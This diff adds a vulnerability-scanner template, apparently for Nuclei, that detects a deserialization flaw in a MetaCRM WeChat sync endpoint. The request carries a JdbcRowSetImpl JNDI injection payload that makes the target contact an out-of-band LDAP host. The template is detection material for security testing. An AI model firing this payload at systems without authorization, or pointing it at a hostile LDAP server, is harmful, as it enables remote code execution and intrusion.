@@ -1,0 +1,28 @@
+id: poc-yaml-metacrm-sync-emp-weixin-deserialization
+info:
+  name: MetaCRM Sync Emp Weixin Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, deserialization
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /weixin/admin/sync_emp_weixin.jsp?emp_json=[{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://{{reverse}}","autoCommit":true}] HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - "ldap://[a-zA-Z0-9.-]+"
